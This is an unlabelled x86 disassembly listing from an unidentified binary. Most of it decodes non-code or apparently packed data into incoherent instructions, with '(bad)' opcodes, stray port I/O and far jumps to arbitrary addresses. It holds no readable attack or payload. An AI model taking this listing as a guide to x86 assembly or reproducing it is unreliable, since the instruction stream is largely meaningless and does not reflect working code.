  42fc98:	frstor [esi-0x46]
  42fc9b:	jns    0x42fcb4
  42fc9d:	je     0x42fc96
  42fc9f:	push   eax
  42fca0:	push   ecx
  42fca1:	into   
  42fca2:	std    
  42fca3:	sub    eax,0x5d95b67e
  42fca8:	(bad)  
  42fcaa:	pop    edi
  42fcab:	and    edx,DWORD PTR [esi]
  42fcad:	push   ebp
  42fcae:	or     eax,0xd97932a
  42fcb3:	sbb    BYTE PTR [ebp-0x21],0xa4
  42fcb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fcb8:	js     0x42fd1b
  42fcba:	mov    esp,0xaecd8904
  42fcbf:	sbb    BYTE PTR es:[ecx-0x3ba3a31e],dh
  42fcc6:	xchg   esi,eax
  42fcc7:	call   0xe82113c0
  42fccc:	inc    esi
  42fccd:	ret    
  42fcce:	mov    dh,BYTE PTR [edi+0x522beffa]
  42fcd4:	imul   ebp,DWORD PTR [esi-0x1c05d98d],0xbd9cb0ed
  42fcde:	cmp    cl,al
  42fce0:	and    DWORD PTR [esi-0x45],0x67380c8a
  42fce7:	pusha  
  42fce8:	shl    BYTE PTR [edi+0x1e],cl
  42fceb:	xchg   edi,eax
  42fcec:	cmp    DWORD PTR [eax-0x50],edx
  42fcef:	scas   al,BYTE PTR es:[edi]
  42fcf0:	cmp    al,0x97
  42fcf2:	xor    DWORD PTR [eiz*1+0x57e191e7],edx
  42fcf9:	push   eax
  42fcfa:	or     bh,BYTE PTR [edi-0x30d45701]
  42fd00:	mov    ecx,0x5b8d5089
  42fd05:	out    0x9b,eax
  42fd07:	sbb    al,0x3e
  42fd09:	mov    eax,0xed7fb65a
  42fd0e:	push   esp
  42fd0f:	or     eax,0xd24f45e2
  42fd14:	leave  
  42fd15:	f2xm1  
  42fd17:	jecxz  0x42fd83
  42fd19:	adc    al,BYTE PTR ds:0x969950d0
  42fd1f:	repz aad 0x1d
  42fd22:	mov    esp,0xaa49f794
  42fd27:	mov    ebx,edi
  42fd29:	aaa    
  42fd2a:	jle    0x42fd89
  42fd2c:	xchg   edx,eax
  42fd2d:	sti    
  42fd2e:	lock mov WORD PTR [eax],?
  42fd31:	in     eax,0xdd
  42fd33:	dec    esp
  42fd34:	imul   esp,DWORD PTR [ebx],0xffffffb5
  42fd37:	mov    cs,WORD PTR ds:0x76c23bf3
  42fd3d:	loop   0x42fd8e
  42fd3f:	add    ah,0x69
  42fd42:	or     edi,DWORD PTR [edi]
  42fd44:	jmp    0x9578:0xec99b43e
  42fd4b:	in     eax,0x59
  42fd4d:	add    DWORD PTR [ebp+0x38],esp
  42fd50:	fistp  WORD PTR [esi-0x47cafd98]
  42fd56:	cmp    ch,dh
  42fd58:	dec    edx
  42fd59:	cmc    
  42fd5a:	sub    DWORD PTR [ecx-0x4502a363],0x9ad9d46a
  42fd64:	xor    al,0x59
  42fd66:	adc    DWORD PTR [edi],esi
  42fd68:	(bad)  
  42fd69:	not    BYTE PTR [esi+edx*4+0x28]
  42fd6d:	mov    al,ds:0x394f71a7
  42fd72:	mov    cl,0x53
  42fd74:	mov    ds:0xeb4fadc5,eax
  42fd79:	scas   eax,DWORD PTR es:[edi]
  42fd7a:	outs   dx,DWORD PTR ds:[esi]
  42fd7b:	mov    eax,0x134d2324
  42fd80:	or     dh,0xa2
  42fd83:	dec    ebp
  42fd84:	mov    BYTE PTR [ecx-0x39],ah
  42fd87:	fild   QWORD PTR [eax+0x5344facf]
  42fd8d:	add    bl,cl
  42fd8f:	pop    ss
  42fd90:	popa   
	...
  42fdf1:	add    BYTE PTR [eax],al
  42fdf3:	add    BYTE PTR [eax-0x40],cl
  42fdf6:	ret    0xcaf0
  42fdf9:	bnd jp 0x42fdf4
  42fdfc:	cmc    
  42fdfd:	inc    edx
  42fdfe:	stos   BYTE PTR es:[edi],al
  42fdff:	repz push 0xa
  42fe02:	popa   
  42fe03:	repnz scas al,BYTE PTR es:[edi]
  42fe05:	add    DWORD PTR [edx],eax
  42fe07:	add    BYTE PTR ds:0x7c000001,al
  42fe0d:	push   0x21
  42fe0f:	push   es
  42fe10:	popa   
  42fe11:	adc    eax,0xeb9447da
  42fe16:	cli    
  42fe17:	fild   WORD PTR [ebx+0x5a]
  42fe1a:	mov    al,0x50
  42fe1c:	fmul   QWORD PTR [esi-0x6f45e485]
  42fe22:	cdq    
  42fe23:	std    
  42fe24:	enter  0xfdcc,0x8
  42fe28:	rol    BYTE PTR [eax+0x56e7c27],0x7c
  42fe2f:	xchg   DWORD PTR [ecx+ecx*4-0x19],esp
  42fe33:	(bad)  
  42fe34:	xor    eax,0xe3ab359b
  42fe39:	add    esi,DWORD PTR [ebx]
  42fe3b:	cmp    al,0x3a
  42fe3d:	cwde   
  42fe3e:	out    0x82,eax
  42fe40:	mov    esp,DWORD PTR [ebp+0x73]
  42fe43:	inc    ebp
  42fe44:	cmp    bh,cl
  42fe46:	jle    0x42fe80
  42fe48:	sar    cl,1
  42fe4a:	dec    ecx
  42fe4b:	inc    ebp
  42fe4c:	jge    0x42fddd
  42fe4e:	repz and al,0x7d
  42fe51:	in     al,dx
  42fe52:	xor    DWORD PTR [ecx-0x49e5e499],ebp
  42fe58:	outs   dx,DWORD PTR ds:[esi]
  42fe59:	ret    
  42fe5a:	and    bh,al
  42fe5c:	dec    ecx
  42fe5d:	xor    esi,DWORD PTR [ebx-0x63921cba]
  42fe63:	js     0x42fe96
  42fe65:	push   esi
  42fe66:	add    esp,DWORD PTR [ecx]
  42fe68:	pop    ebx
  42fe69:	hlt    
  42fe6a:	std    
  42fe6b:	clc    
  42fe6c:	add    eax,DWORD PTR [ebx-0x6fe6bb69]
  42fe72:	mov    ds:0x96c77922,eax
  42fe77:	jne    0x42fe23
  42fe79:	add    eax,0xb56e9907
  42fe7e:	and    eax,0x162e4d5c
  42fe83:	inc    ecx
  42fe84:	and    BYTE PTR [esi],cl
  42fe86:	mov    edi,0x93088a4b
  42fe8b:	xchg   ebp,eax
  42fe8c:	inc    edi
  42fe8d:	jae    0x42fefa
  42fe8f:	mov    cl,0x14
  42fe91:	sti    
  42fe92:	mov    ah,0x6e
  42fe94:	ins    BYTE PTR es:[edi],dx
  42fe95:	test   BYTE PTR [eax-0x7d],cl
  42fe98:	(bad)  
  42fe99:	das    
  42fe9a:	mov    edi,0x8b327581
  42fe9f:	fldl2t 
  42fea1:	mov    eax,ds:0xb643e4ba
  42fea6:	xor    eax,0xf2db410a
  42feab:	and    eax,0xdf2398ac
  42feb0:	or     eax,DWORD PTR [edi]
  42feb2:	jae    0x42fef7
  42feb4:	push   0x527174ac
  42feb9:	fld    QWORD PTR [ecx+0x58]
  42febc:	push   ebx
  42febd:	cmp    DWORD PTR [esi+0x1e6b22b7],0x65417356
  42fec7:	push   edi
  42fec8:	(bad)  
  42fec9:	sbb    bl,BYTE PTR [edi+0x1c]
  42fecc:	(bad)  
  42fecd:	push   edi
  42fece:	cmp    DWORD PTR [edx-0x55],ebp
  42fed1:	pop    ebx
  42fed2:	es in  al,dx
  42fed4:	scas   al,BYTE PTR es:[edi]
  42fed5:	fadd   DWORD PTR [ecx+ebp*2-0x5ddf16a3]
  42fedc:	jl     0x42fe82
  42fede:	fwait
  42fedf:	pop    esi
  42fee0:	in     al,0x20
  42fee2:	xchg   esi,eax
  42fee3:	(bad)  
  42fee4:	(bad)  
  42fee5:	or     ebp,DWORD PTR [ecx+ecx*8-0x71eeb6ea]
  42feec:	add    al,0xf8
  42feee:	and    ebx,DWORD PTR [edx-0x5ec6a28f]
  42fef4:	test   BYTE PTR [eax+0x348ae9bf],al
  42fefa:	shl    bl,1
  42fefc:	pop    edi
  42fefd:	(bad)  
  42fefe:	lods   eax,DWORD PTR ds:[esi]
  42feff:	lahf   
  42ff00:	out    0xd1,al
  42ff02:	lods   al,BYTE PTR ds:[esi]
  42ff03:	scas   al,BYTE PTR es:[edi]
  42ff04:	repnz (bad) 
  42ff06:	(bad)  
  42ff07:	pop    ss
  42ff08:	mov    esi,DWORD PTR [ecx]
  42ff0a:	xchg   esp,eax
  42ff0b:	out    0x65,eax
  42ff0d:	xchg   BYTE PTR [esi+0x75da],bl
	...
  42ff73:	add    BYTE PTR [edi+eiz*2],al
  42ff76:	std    
  42ff77:	aaa    
  42ff78:	(bad)  
  42ff79:	mov    edi,0x9ffa77ce
  42ff7e:	shl    DWORD PTR [eax+eax*8-0xe],0x21
  42ff83:	inc    esp
  42ff84:	mov    bl,0x2
  42ff86:	add    al,BYTE PTR [eax]
  42ff88:	add    eax,0x6d000001
  42ff8d:	mov    ds:0x5f6288d8,al
  42ff92:	(bad)  
  42ff93:	(bad)  
  42ff94:	leave  
  42ff95:	xchg   ecx,eax
  42ff96:	fwait
  42ff97:	test   eax,0xc201d847
  42ff9c:	shr    BYTE PTR [ebx+0xc1184d4],cl
  42ffa2:	fcmovnu st,st(7)
  42ffa4:	inc    edi
  42ffa5:	or     eax,0xef777371
  42ffaa:	mov    bh,BYTE PTR [edi]
  42ffac:	(bad)  
  42ffad:	into   
  42ffae:	and    al,0xdb
  42ffb0:	add    ebp,DWORD PTR [edx+0x2982303b]
  42ffb6:	in     eax,0x4d
  42ffb8:	ror    DWORD PTR [ebp+0x51e18d49],0xdb
  42ffbf:	int3   
  42ffc0:	or     BYTE PTR [ecx],ah
  42ffc2:	push   0xb6d54f7e
  42ffc7:	std    
  42ffc8:	fdiv   QWORD PTR [edx]
  42ffca:	add    eax,0x839cfee2
  42ffcf:	mov    al,al
  42ffd1:	xlat   BYTE PTR ds:[ebx]
  42ffd2:	and    BYTE PTR [esi+0x62],cl
  42ffd5:	pop    edi
  42ffd6:	xchg   ebp,eax
  42ffd7:	mov    edi,0x4f4aedc5
  42ffdc:	jns    0x430028
  42ffde:	xchg   ecx,eax
  42ffdf:	je     0x42ffe8
  42ffe1:	xchg   DWORD PTR [edx-0x69dc3f14],ebp
  42ffe7:	icebp  
  42ffe8:	sub    eax,0xd5af7dca
  42ffed:	cwde   
  42ffee:	mov    ebp,0x879dc071
  42fff3:	bound  ebp,QWORD PTR [ebx+0xcb3f3db]
  42fff9:	inc    DWORD PTR [ebx-0x385a03cc]
  42ffff:	dec    esp
  430000:	cmp    al,0xbd
  430002:	xchg   ebp,ebp
  430004:	pop    edx
  430005:	push   ebp
  430006:	push   edx
  430007:	dec    ebp
  430008:	(bad)  
  430009:	(bad)  
  43000b:	lea    edx,[edi]
  43000d:	jmp    0x5395:0x90a511ba
  430014:	imul   eax,DWORD PTR [edx+0x4f1a6191],0x6c
  43001b:	mov    ebx,0x2a39475d
  430020:	rcr    DWORD PTR [edi+0x77],0x57
  430024:	adc    BYTE PTR [edi-0xf],al
  430027:	in     eax,dx
  430028:	pop    ecx
  430029:	stos   DWORD PTR es:[edi],eax
  43002a:	ror    ch,0xc8
  43002d:	push   0x6e
  43002f:	fistp  QWORD PTR ds:0x556f68d9
  430035:	cmp    esp,edi
  430037:	xchg   edx,eax
  430038:	outs   dx,BYTE PTR ds:[esi]
  430039:	fstp   TBYTE PTR [eax+0xa51e609]
  43003f:	test   BYTE PTR [ebp+0x2bdf1640],al
  430045:	add    DWORD PTR [edx],edi
  430047:	and    ebp,ebx
  430049:	idiv   BYTE PTR [edx+0x7c]
  43004c:	push   ds
  43004d:	shl    BYTE PTR [ecx+edi*1],cl
  430050:	outs   dx,DWORD PTR ds:[esi]
  430051:	push   ebx
  430052:	push   ecx
  430053:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430054:	je     0x43007c
  430056:	xlat   BYTE PTR ds:[ebx]
  430057:	adc    DWORD PTR [eax+0x7d],0xfb16419d
  43005e:	sbb    bh,BYTE PTR [ebx-0xa]
  430061:	cwde   
  430062:	dec    ecx
  430063:	call   0xc06d411f
  430068:	lock dec BYTE PTR [esi+0x42100974]
  43006f:	jno    0x430012
  430071:	cmc    
  430072:	(bad)  
  430073:	push   edi
  430074:	icebp  
  430075:	dec    ebx
  430076:	push   esi
  430077:	aaa    
  430078:	dec    edi
  430079:	mov    dh,0x7d
  43007b:	js     0x4300a3
  43007d:	cmp    bl,BYTE PTR [ebx]
  43007f:	and    eax,0xc810405d
  430084:	jnp    0x4300d2
  430086:	lods   al,BYTE PTR ds:[esi]
  430087:	xchg   DWORD PTR [esi+0x5ecae796],esp
  43008d:	mov    eax,ds:0x494cca
	...
  4300f2:	add    BYTE PTR [eax],al
  4300f4:	(bad)  
  4300f5:	ins    DWORD PTR es:[edi],dx
  4300f6:	aam    0xb5
  4300f8:	(bad)  
  4300f9:	mov    ebp,0x9547fe7
  4300fe:	scas   eax,DWORD PTR es:[edi]
  4300ff:	add    al,0x3c
  430101:	jge    0x43014b
  430103:	in     eax,dx
  430104:	mov    eax,0x27000203
  430109:	add    BYTE PTR [eax],al
  43010b:	add    BYTE PTR ds:0x2b109aa7,dh
  430111:	inc    esi
  430112:	inc    esi
  430113:	xchg   dh,al
  430115:	imul   eax,ebp,0x4f
  430118:	mov    edi,0x6985edb
  43011d:	jbe    0x43018b
  43011f:	loop   0x430129
  430121:	push   es
  430122:	outs   dx,BYTE PTR ds:[esi]
  430123:	popf   
  430124:	mov    esi,0x1893a4ca
  430129:	push   edi
  43012a:	imul   eax,DWORD PTR [edx-0x78],0x7af6b993
  430131:	mov    ebp,0x1e
	...
  430172:	add    BYTE PTR [eax],al
  430174:	dec    ebp
  430175:	push   ebp
  430176:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  43017c:	mov    esp,ebp
  43017e:	or     ah,dh
  430180:	dec    ebp
  430181:	add    bh,al
  430183:	add    BYTE PTR [eax],cl
  430185:	add    BYTE PTR [eax],al
  430187:	mov    DWORD PTR [eax],0x40f44545
  43018d:	xor    DWORD PTR [eax],eax
  43018f:	test   DWORD PTR [ebx-0x34070b64],ecx
  430195:	(bad)  
  430196:	enter  0x4d45,0xbc
  43019a:	mov    esi,DWORD PTR [edx]
  43019c:	hlt    
  43019d:	test   ebx,ecx
  43019f:	pushf  
  4301a0:	enter  0x4df8,0x8b
  4301a4:	mov    DWORD PTR [ebp+0x8],0x894708
  4301ab:	inc    ebp
  4301ac:	mov    ebp,0xff8bfffc
  4301b1:	dec    ebp
  4301b2:	mov    ch,0xf4
  4301b4:	call   DWORD PTR [ebx-0x1]
  4301b7:	mov    ebx,0x8005474
  4301bc:	call   DWORD PTR [ecx+0x8]
  4301bf:	pop    es
  4301c0:	jmp    0xb8:0xacb4533
  4301c7:	fwait
  4301c8:	mov    esi,DWORD PTR [edx-0xc]
  4301cb:	xor    cl,bl
  4301cd:	add    BYTE PTR [ebx+0x3c83203],bl
  4301d3:	mov    DWORD PTR [ecx+0x4dd0084d],ecx
  4301d9:	mov    eax,DWORD PTR [ebx-0xb9bb3]
  4301df:	xor    eax,DWORD PTR [eax]
  4301e1:	retf   
  4301e2:	retf   
  4301e3:	add    ecx,eax
  4301e5:	enter  0x894d,0x64
  4301e9:	dec    ebp
  4301ea:	sbb    ah,cl
  4301ec:	add    BYTE PTR [ebx-0xb9bb277],cl
  4301f2:	dec    DWORD PTR [ebx-0xbcfb275]
  4301f8:	test   DWORD PTR [ebx],esi
  4301fa:	dec    ebx
  4301fc:	inc    DWORD PTR [ebx]
  4301fe:	inc    eax
  4301ff:	enter  0x8989,0x50
  430203:	(bad)  
  430204:	call   DWORD PTR [ebx+ecx*4-0x1]
  430208:	cld    
  430209:	dec    DWORD PTR [ebp-0xa90001]
  43020f:	push   edi
  430210:	mov    BYTE PTR [edx+0x1],ch
  430213:	and    al,BYTE PTR [eax]
  430215:	pop    ecx
  430216:	inc    ebp
  430217:	mov    DWORD PTR [ebp-0xb2a7f8],ecx
  43021d:	push   0xffffff89
  43021f:	pop    ecx
  430220:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430221:	dec    ebp
  430222:	add    BYTE PTR [ecx+0x45fc088b],cl
  430228:	jne    0x430274
  43022a:	lea    eax,[eax]
  43022c:	push   eax
  43022d:	(bad)  
  43022e:	dec    DWORD PTR [eax]
  430230:	mov    DWORD PTR [eax],eax
  430232:	test   al,0x0
  430234:	add    BYTE PTR [ebp-0x18],cl
  430237:	xor    ebp,DWORD PTR [ebx]
  430239:	add    eax,DWORD PTR [eax]
  43023b:	mov    eax,eax
  43023d:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  430244:	inc    ebp
  430245:	mov    DWORD PTR [ebx+0x459408],ecx
  43024b:	arpl   WORD PTR [ebx-0x372749b],cx
  430251:	sub    al,0x80
  430253:	inc    DWORD PTR [ecx]
  430255:	lea    eax,[eax]
  430257:	or     al,0x0
  430259:	inc    DWORD PTR [ecx-0x18]
  43025c:	mov    ecx,DWORD PTR [ebx]
  43025e:	cld    
  43025f:	add    BYTE PTR [ecx+0x75014d],cl
  430265:	(bad)  
  430266:	xchg   ebp,eax
  430267:	fdivr  st,st(7)
  430269:	inc    eax
  43026a:	inc    DWORD PTR [eax]
  43026c:	mov    ecx,DWORD PTR [ebp-0x4]
  43026f:	xor    edx,DWORD PTR [edx+0x7201b8]
  430275:	add    BYTE PTR [edx],dl
  430277:	enter  0x4d90,0x0
  43027b:	mov    eax,DWORD PTR [eax]
  43027d:	hlt    
  43027e:	add    al,0xa5
  430280:	mov    al,0xff
  430282:	add    bh,bh
  430284:	add    BYTE PTR [ebx],dh
  430286:	inc    DWORD PTR [ebx]
  430288:	sbb    al,0x89
  43028a:	jne    0x430268
  43028c:	mov    esp,DWORD PTR [ecx+0x4500fc]
  430292:	mov    eax,DWORD PTR [ebp-0xff0048]
  430298:	mov    DWORD PTR [eax-0x70],0xec58ed89
  43029f:	inc    DWORD PTR [ebp-0x75]
  4302a2:	fisttp QWORD PTR [esi+ebp*8]
  4302a5:	test   DWORD PTR [esi-0x1],esp
  4302a8:	inc    ebp
  4302a9:	(bad)  
  4302aa:	aas    
  4302ab:	inc    ebp
  4302ac:	(bad)  
  4302ad:	lea    edi,[esp+eiz*2-0x1]
  4302b1:	inc    edi
  4302b3:	mov    DWORD PTR ds:0x8000c7a0,edi
  4302b9:	mov    ebp,esp
  4302bb:	cld    
  4302bc:	loop   0x43024b
  4302be:	inc    ebp
  4302bf:	(bad)  
  4302c0:	out    dx,al
  4302c1:	(bad)  
  4302c2:	fisttp WORD PTR [eax+0x8801c7]
  4302c8:	jecxz  0x43030f
  4302ca:	in     al,dx
  4302cb:	inc    DWORD PTR [ebp-0x4]
  4302ce:	out    0x8d,eax
  4302d0:	aas    
  4302d1:	inc    edi
  4302d3:	jmp    FWORD PTR [eax-0x78]
  4302d6:	inc    DWORD PTR [ecx]
  4302d8:	mov    DWORD PTR [eax],0xc7043d
  4302de:	ins    BYTE PTR es:[edi],dx
  4302df:	test   edi,edi
  4302e1:	pandn  mm0,mm5
  4302e4:	aas    
  4302e5:	add    bh,al
  4302e7:	mov    esi,DWORD PTR [eax-0x4]
  4302ea:	inc    DWORD PTR [eax+0xdf01ee]
  4302f0:	(bad)  
  4302f1:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4302f5:	mov    ebp,ebx
  4302f7:	xchg   esp,eax
  4302f8:	fild   DWORD PTR [eax]
  4302fa:	(bad)  
  4302fb:	mov    edi,DWORD PTR [eax+0x3]
  4302fe:	(bad)  
  4302ff:	cmp    al,0xe7
  430301:	dec    ebp
  430302:	leave  
  430303:	mov    ebp,eax
  430305:	fsubr  DWORD PTR [edx]
  430307:	add    BYTE PTR [eax],al
  430309:	lea    ecx,[ebx-0x7f0003b4]
  43030f:	push   edx
  430310:	add    DWORD PTR [ebp+0x0],edx
  430313:	mov    esi,DWORD PTR [eax]
  430315:	mov    WORD PTR [edi],ss
  430317:	add    BYTE PTR [eax],al
  430319:	mov    eax,DWORD PTR [ebp-0x74778afd]
  43031f:	add    ah,bh
  430321:	push   0x7d
  430323:	dec    DWORD PTR [ebx+0xd88c]
  430329:	push   edx
  43032a:	mov    edx,DWORD PTR [ecx-0x4]
  43032d:	call   DWORD PTR [eax+0x7d01fc]
  430333:	mov    esi,DWORD PTR [esi]
  430335:	cld    
  430336:	add    BYTE PTR [eax+0x560150],dl
  43033c:	test   DWORD PTR [ebp+0x75],eax
  43033f:	loop   0x4302cc
  430341:	jmp    0xe38b:0x947dc7fc
  430348:	fsub   st,st(7)
  43034a:	add    bh,al
  43034c:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  430352:	add    edi,edi
  430354:	add    bh,bh
  430356:	adc    al,0xed
  430358:	add    dh,ah
  43035a:	push   eax
  43035b:	inc    ebp
  43035c:	push   esi
  43035d:	fisttp WORD PTR [ebx+0x4dc7f43f]
  430363:	test   BYTE PTR [ebx],dh
  430365:	out    0x5,al
  430367:	shl    BYTE PTR [edx+0x45],0x0
  43036b:	jmp    0x43032e
  43036d:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  430374:	inc    esi
  430375:	jle    0x430377
  430377:	test   edi,eax
  430379:	(bad)  
  43037a:	call   0x130047e
  43037f:	out    0x75,al
  430381:	test   DWORD PTR [ebx+0x45fffcff],ecx
  430387:	in     al,dx
  430388:	mov    esp,edx
  43038a:	mov    ah,0x85
  43038c:	add    bh,bh
  43038e:	call   0x1292d92
  430393:	ror    BYTE PTR [ebx-0x7f00037b],0xff
  43039a:	add    ebx,esp
  43039c:	add    ah,ch
  43039e:	xor    BYTE PTR [ebp-0xff0073],al
  4303a4:	mov    ebx,ebp
  4303a6:	cld    
  4303a7:	jle    0x430332
  4303a9:	add    DWORD PTR gs:[eax],eax
  4303ac:	add    BYTE PTR [eax+0x1],dl
  4303af:	inc    ebp
  4303b0:	inc    ebp
  4303b1:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  4303b7:	dec    DWORD PTR [ebx-0x3fd80318]
  4303bd:	add    BYTE PTR [ebp-0xbf0040],dl
  4303c3:	inc    ebp
  4303c4:	fmul   QWORD PTR [ebx-0x4faf0400]
  4303ca:	inc    ebp
  4303cb:	add    DWORD PTR [ebx+0x459c00],ecx
  4303d1:	mov    edi,edi
  4303d3:	mov    eax,0xe80800ff
  4303d8:	inc    ebp
  4303d9:	sub    cl,BYTE PTR [ebx-0x47000400]
  4303df:	add    al,0x1
  4303e1:	rol    BYTE PTR [eax],0x1e
  4303e4:	jne    0x43042b
  4303e6:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  4303ec:	inc    DWORD PTR [ecx]
  4303ee:	call   0x882cf3
  4303f3:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  4303f9:	call   0x432dff
  4303fe:	xor    bh,bh
  430400:	push   edi
  430401:	adc    BYTE PTR [ebx-0x74741bbb],al
  430407:	fsub   st,st(4)
  430409:	ret    
  43040a:	loopne 0x4303a7
  43040c:	xor    DWORD PTR [edx],0x31
  43040f:	cmp    edi,edi
  430411:	bswap  eax
  430413:	rol    BYTE PTR gs:[eax],0x5
  430417:	jmp    0x12e0561
  43041c:	mov    eax,DWORD PTR [ebp-0x4]
  43041f:	add    BYTE PTR [eax+0xff0100],bh
  430425:	cld    
  430426:	jne    0x4304a5
  430428:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  43042e:	jb     0x430431
  430430:	add    BYTE PTR [eax],al
  430432:	push   eax
  430433:	fild   DWORD PTR [ebp+0x0]
  430436:	mov    edx,DWORD PTR [eax-0x68]
  430439:	inc    ebp
  43043a:	add    BYTE PTR [ebx+0xffa8ff],cl
  430440:	or     bh,bh
  430442:	inc    ebp
  430443:	call   0x1272b47
  430448:	jge    0x430497
  43044a:	adc    BYTE PTR [ebx+0x459cb9],cl
  430450:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  430456:	fwait
  430457:	mov    eax,0x30132
  43045c:	lea    esi,[ebp+0x2c]
  43045f:	xor    edi,edi
  430461:	(bad)  
  430462:	call   0x1422dcf
  430467:	call   0x1372df7
  43046c:	jne    0x4303f9
  43046e:	xor    edi,esp
  430470:	add    eax,DWORD PTR [eax+0xc018d]
  430476:	push   DWORD PTR [eax]
  430478:	call   0xcc2dd4
  43047d:	enter  0x45ff,0xe0
  430481:	mov    ecx,DWORD PTR [ebp-0x28]
  430484:	xor    eax,DWORD PTR [eax]
  430486:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  43048c:	(bad)  
  43048d:	xchg   ebp,eax
  43048e:	call   0x1420592
  430493:	mov    cl,0x45
  430495:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  43049b:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff65]
  4304a2:	mov    edi,edi
  4304a4:	or     BYTE PTR [eax],cl
  4304a6:	inc    ebp
  4304a7:	test   DWORD PTR gs:[eax],eax
  4304aa:	je     0x4304f1
  4304ac:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  4304b2:	xor    edx,DWORD PTR [eax-0x73]
  4304b5:	push   ebp
  4304b6:	or     BYTE PTR [ebp+0x21007572],al
  4304bc:	inc    ebp
  4304bd:	loopne 0x43044a
  4304bf:	sub    BYTE PTR [ebp+eax*2-0x279a743d],bh
  4304c6:	int    0x0
  4304c8:	sub    ecx,DWORD PTR [ebx-0x3f2703fd]
  4304ce:	inc    ebp
  4304cf:	push   ebp
  4304d0:	cmp    ebp,eax
  4304d2:	movaps XMMWORD PTR [eax-0x74740100],xmm4
  4304d9:	cld    
  4304da:	fadd   QWORD PTR [eax+0x3b014d]
  4304e0:	jne    0x430512
  4304e2:	push   0xf8898557
  4304e7:	loopne 0x43055e
  4304e9:	inc    ebp
  4304ea:	lea    eax,[ebx+0x72e8e4cc]
  4304f0:	xor    DWORD PTR [ebx+0x7545bc00],ecx
  4304f6:	jmp    0x43052b
  4304f8:	mov    edi,DWORD PTR [edi+0x4572bc]
  4304fe:	xor    eax,edi
  430500:	adc    DWORD PTR [ebp-0xcd0065],0x8b3d31
  43050a:	rcl    BYTE PTR [eax-0x40],1
  43050d:	inc    ebp
  43050e:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  430516:	inc    ebp
  430517:	xchg   ebp,eax
  430518:	ud0    ebp,DWORD PTR [ebx]
  43051b:	inc    DWORD PTR [eax]
  43051d:	daa    
  43051e:	jbe    0x430520
  430520:	mov    dl,BYTE PTR [eax-0x80]
  430523:	push   ebp
  430524:	pop    ds
  430525:	mov    ecx,DWORD PTR [esp+esi*8]
  430528:	inc    eax
  430529:	retf   
  43052a:	inc    ebp
  43052b:	iret   
  43052c:	jb     0x4304f6
  43052e:	mov    eax,DWORD PTR [edi]
  430530:	int3   
  430531:	inc    ebp
  430532:	inc    ebp
  430533:	add    DWORD PTR [ecx],esi
  430535:	add    BYTE PTR [ebx+ecx*4+0x4df0bc89],bl
  43053c:	xor    dh,BYTE PTR [ebx]
  43053e:	pushf  
  43053f:	lea    ecx,[ecx+0x4d72d808]
  430545:	add    BYTE PTR [ebx],dh
  430547:	inc    ebp
  430548:	mov    DWORD PTR [ebx-0x3f64174c],ecx
  43054e:	xor    dl,BYTE PTR [edx]
  430550:	add    eax,DWORD PTR [ebp-0x77]
  430553:	mov    eax,esp
  430555:	fmul   QWORD PTR [ebp-0x3d]
  430558:	xor    eax,DWORD PTR [ebx+eax*1+0x832899b]
  43055f:	mov    DWORD PTR [ebp-0x24],eax
  430562:	rol    DWORD PTR [ebp-0x64],1
  430565:	xor    eax,edi
  430567:	mov    ecx,0xff858db0
  43056c:	clc    
  43056d:	enter  0x4d45,0x3c
  430571:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  430578:	test   esi,edi
  43057a:	clc    
  43057b:	inc    DWORD PTR [ebp+0x45]
  43057e:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  430586:	test   DWORD PTR [ecx],esi
  430588:	clc    
  430589:	pushf  
  43058a:	inc    ebp
  43058b:	(bad)  
  43058c:	cmp    ah,bh
  43058e:	pushf  
  43058f:	inc    ebp
  430590:	mov    edx,DWORD PTR [eax-0x24]
  430593:	add    BYTE PTR [ebp+0x0],dl
  430596:	xor    ecx,DWORD PTR [ecx+0x103bd003]
  43059c:	cmovge edx,DWORD PTR [ebx+ecx*4]
  4305a0:	add    al,dl
  4305a2:	jmp    0x1040772
  4305a7:	jb     0x4305f6
  4305a9:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  4305af:	xor    ecx,DWORD PTR [ebp+0x3b]
  4305b2:	xor    ecx,DWORD PTR [edi]
  4305b4:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  4305b8:	(bad)  
  4305ba:	clc    
  4305bb:	int3   
  4305bc:	add    BYTE PTR [ebx+ecx*4+0x5500b007],al
  4305c3:	push   cs
  4305c4:	xor    ecx,eax
  4305c6:	xor    esp,ecx
  4305c8:	add    ebp,DWORD PTR [eax]
  4305ca:	add    esi,DWORD PTR [eax]
  4305cc:	(bad)  
  4305ce:	retf   0x55cc
  4305d1:	repnz mov eax,DWORD PTR [ebp-0x10]
  4305d5:	(bad)  
  4305d6:	cli    
  4305d7:	fdiv   st(1),st
  4305d9:	test   DWORD PTR [eax+edi*8],ecx
  4305dc:	dec    ebp
  4305dd:	inc    ebp
  4305de:	xor    edi,DWORD PTR [eax-0x7167afd]
  4305e4:	add    BYTE PTR [ebp+0x0],al
  4305e7:	mov    ecx,DWORD PTR [ebp-0x24]
  4305ea:	mov    ecx,ebx
  4305ec:	clc    
  4305ed:	jne    0x4305ba
  4305ef:	mov    esi,0xd672d3
  4305f4:	into   
  4305f5:	into   
  4305f6:	scas   eax,DWORD PTR es:[edi]
  4305f7:	dec    ebp
  4305f8:	mov    ecx,DWORD PTR [ebx-0x3482233c]
  4305fe:	sub    ecx,esi
  430600:	cmp    ecx,DWORD PTR [ebp+0x77]
  430603:	(bad)  
  430604:	mov    edi,eax
  430606:	mov    al,0x85
  430608:	mov    eax,edi
